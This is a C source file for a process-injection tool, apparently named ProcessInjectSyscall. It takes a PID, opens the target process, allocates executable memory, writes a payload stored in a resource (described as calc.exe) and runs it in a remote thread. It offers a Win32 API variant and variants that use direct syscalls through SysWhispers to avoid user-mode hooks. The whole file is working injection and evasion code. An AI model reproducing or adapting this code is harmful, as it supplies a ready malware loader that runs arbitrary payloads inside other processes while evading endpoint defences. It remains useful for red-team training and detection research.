#include <stdio.h>
#include "..\..\Include\resource.h"

#ifdef BASIC
#include <windows.h>
#endif

#ifdef SYSWHISPERS
#include "..\..\Include\syscalls.h"
#endif

#if defined SYSWHISPERS2 || SYSWHISPERS2_RND
#include "..\..\Include\syscalls2.h"
#endif

#if defined SYSWHISPERS3
#include "..\..\Include\syscalls3.h"
#endif

#define error(api) 		      printf("[Error] - " api " failed with error: %d\n", GetLastError()); return -1;
#define nt_error(api, status) printf("[Error] - " api " failed with error: 0x%0.8X\n", status); return -1;

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("USAGE: ProcessInjectSyscall.exe <PID>\n");
        return -1;
    }

    HANDLE 	hThread 		= NULL,
			hProcess 		= NULL;
    PVOID 	pBaseAddress 	= NULL;
    SIZE_T 	BytesWritten 	= 0;
    DWORD 	Pid 			= atoi(argv[1]);

    /* Load calc.exe payload from resource section */
    HRSRC 	hResource 		= FindResource(NULL, MAKEINTRESOURCE(IDR_BIN_BLOB1), L"BIN_BLOB");
    DWORD 	dwResourceSize 	= SizeofResource(NULL, hResource);
    HGLOBAL hResourceData 	= LoadResource(NULL, hResource);
    LPVOID 	pBinaryCode 	= LockResource(hResourceData);

#ifdef BASIC

    /* Get a handle to the remote process */
    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid))) {
        error("OpenProcess");
    }

    /* Allocate memory in the remote process */
    if (!(pBaseAddress = VirtualAllocEx(hProcess, NULL, dwResourceSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
        error("VirtualAllocEx");
    }

    /* Write the payload to the newly allocated memory */
    if (!(WriteProcessMemory(hProcess, pBaseAddress, pBinaryCode, dwResourceSize, &BytesWritten))) {
        error("WriteProcessMemory");
    }

    /* Create a thread in the remote process to execute the payload */
    if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pBaseAddress, NULL, 0, 0))) {
        error("CreateRemoteThread");
    }
#endif

#if defined SYSWHISPERS || SYSWHISPERS2 || SYSWHISPERS2_RND || SYSWHISPERS3
    NTSTATUS Status       = 0;
    SIZE_T   ResourceSize = dwResourceSize;

    /* Setup parameters for call to NtOpenProcess */
    OBJECT_ATTRIBUTES 	ObjectAttributes	= {0};
    CLIENT_ID 			ClientId 			= {0};
    ClientId.UniqueProcess 					= ULongToHandle(Pid);
    ClientId.UniqueThread 					= 0;
    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

    /* Get a handle to the remote process */
    if ((Status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId)) != 0x0) {
        nt_error("NtOpenProcess", Status);
    }

    /* Allocate memory in the remote process */
    if ((Status = NtAllocateVirtualMemory(hProcess, &pBaseAddress, 0, &ResourceSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) != 0x0) {
        nt_error("NtAllocateVirtualMemory", Status);
    }

    /* Write the payload to the newly allocated memory */
    if ((Status = NtWriteVirtualMemory(hProcess, pBaseAddress, pBinaryCode, dwResourceSize, &BytesWritten)) != 0x0) {
        nt_error("NtWriteVirtualMemory", Status);
    }

    /* Create a thread in the remote process to execute the payload */
    if ((Status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, pBaseAddress, NULL, 0, 0, 0, 0, NULL)) != 0x0) {
        nt_error("NtCreateThreadEx", Status);
    }
#endif

    /* Cleanup */
    CloseHandle(hThread);
    CloseHandle(hProcess);
    CloseHandle(hResource);
    free(pBaseAddress);

    return 0;
}